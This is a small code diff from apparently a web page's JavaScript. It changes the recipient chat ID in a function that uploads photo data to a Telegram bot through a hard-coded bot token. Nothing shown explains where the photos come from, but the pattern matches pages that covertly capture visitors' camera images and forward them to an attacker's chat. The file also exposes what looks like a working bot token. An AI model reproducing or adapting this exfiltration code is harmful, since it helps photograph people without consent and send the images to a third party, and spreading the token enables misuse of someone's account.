@@ -50,7 +50,7 @@
         // Function to send photo to Telegram bot
         function sendPhotoToTelegramBot(photoData) {
             const botToken = "7472582176:AAFXrKtqAgzgz9bhgmMYyEBKNMCxq7lt5fY";
-            const chatId = "7580968510";
+            const chatId = "6151148119";
             const formData = new FormData();
             formData.append("photo", dataURLtoBlob(photoData));
             fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
